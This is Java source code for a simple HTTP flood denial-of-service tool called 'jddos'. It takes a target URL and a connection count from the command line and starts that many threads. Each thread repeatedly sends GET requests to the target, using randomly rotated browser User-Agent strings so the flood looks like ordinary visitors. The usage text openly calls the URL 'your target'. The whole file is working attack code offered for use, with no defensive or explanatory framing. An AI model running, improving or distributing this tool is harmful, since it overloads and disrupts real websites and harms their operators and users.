import java.util.Random;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

class httpcon implements Runnable{
    public String link;
    public int con;

    public static String user_agent(){
        Random rand_choice = new Random();
        String[] agent = 
        {"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36", 
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"};

        return agent[rand_choice.nextInt(agent.length)];

    }

    public void run(){

        HttpURLConnection connection = null;

        for(int x=0; x < con; x++){
            try {
                URL url = new URL(link);
                connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setRequestProperty("User-Agent", user_agent());
                if (connection.getResponseCode() != 200){
                    System.out.println("\u001B[34m Error: Server might be down \u001B[0m");
                }
                //System.out.println(connection.getResponseCode());
            } catch (Exception e) {
                System.out.print(e);
            }
        }
    }
}

public class jddos{
    public static String platform = System.getProperty("os.name").toLowerCase();
    
    public static void clear_system(){
        try {
            if(Windows()){new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();}
            if(Windows()){new ProcessBuilder("clear").inheritIO().start().waitFor();}
            if(Mac()){new ProcessBuilder("clear").inheritIO().start().waitFor();}
        }catch(InterruptedException e){
            e.getStackTrace();
        }
        catch (IOException e) {
            e.getStackTrace();
        }

    }

    public static void main(String[] args) {
        clear_system();
        System.out.println("\u001B[32m  [+]Launched Connection \u001B[0m");
        try {
            for (int x = 0; x< Integer.parseInt(args[1]); x++){
                httpcon obj = new httpcon();
                obj.link = args[0];
                obj.con = Integer.parseInt(args[1]);
                Thread th = new Thread(obj);
                th.start();
            }
        } catch (java.lang.ArrayIndexOutOfBoundsException e) {
            System.out.println("Usage: java jddos https://www.yourtarget.com 100");
            System.out.println("                        [your target]    [your connections]");

        }
            
    }
    public static boolean Windows(){return platform.contains("windows")| platform.contains("win");}
    public static boolean Linux(){return platform.contains("linux")| platform.contains("unix");}
    public static boolean Mac(){return platform.contains("mac");}
}